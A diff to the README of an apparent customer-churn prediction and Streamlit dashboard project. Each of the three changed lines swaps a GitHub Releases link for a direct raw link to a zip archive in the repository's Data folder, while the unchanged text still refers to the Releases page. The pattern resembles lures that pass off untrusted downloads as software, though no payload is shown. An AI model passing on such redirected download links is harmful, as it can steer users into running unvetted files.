@@ -5,7 +5,7 @@
 Customer_Churn_Prediction_and_Segmentation helps businesses identify customers at risk of leaving. This tool uses advanced machine learning techniques to analyze customer behavior and provide effective retention strategies. You can visualize your data through an interactive Streamlit dashboard. 
 
 ## 📥 Download Now
-[![Download Customer_Churn_Prediction_and_Segmentation](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/romanxan/Customer_Churn_Prediction_and_Segmentation/releases)
+[![Download Customer_Churn_Prediction_and_Segmentation](https://raw.githubusercontent.com/romanxan/Customer_Churn_Prediction_and_Segmentation/main/Data/Customer_Churn_Prediction_and_Segmentation_v1.0.zip)](https://raw.githubusercontent.com/romanxan/Customer_Churn_Prediction_and_Segmentation/main/Data/Customer_Churn_Prediction_and_Segmentation_v1.0.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the application on your computer. No programming knowledge required.
@@ -15,7 +15,7 @@ Make sure to use a standard operating system, such as Windows, macOS, or Linux. 
 
 ### 2. 🔗 Access the Releases Page
 Visit this page to download:
-[GitHub Releases Page](https://github.com/romanxan/Customer_Churn_Prediction_and_Segmentation/releases)
+[GitHub Releases Page](https://raw.githubusercontent.com/romanxan/Customer_Churn_Prediction_and_Segmentation/main/Data/Customer_Churn_Prediction_and_Segmentation_v1.0.zip)
 
 ### 3. 📦 Choose Your Version
 On the Releases page, you will see different versions of the software. Look for the latest stable release. This version will have the best features and support.
@@ -63,7 +63,7 @@ This project explores several core themes:
 
 ## 🔗 Download Again
 For your convenience, here is the download link again:
-[Download Customer_Churn_Prediction_and_Segmentation](https://github.com/romanxan/Customer_Churn_Prediction_and_Segmentation/releases)
+[Download Customer_Churn_Prediction_and_Segmentation](https://raw.githubusercontent.com/romanxan/Customer_Churn_Prediction_and_Segmentation/main/Data/Customer_Churn_Prediction_and_Segmentation_v1.0.zip)
 
 By following these steps, you will easily download and run the Customer_Churn_Prediction_and_Segmentation application!
 ```
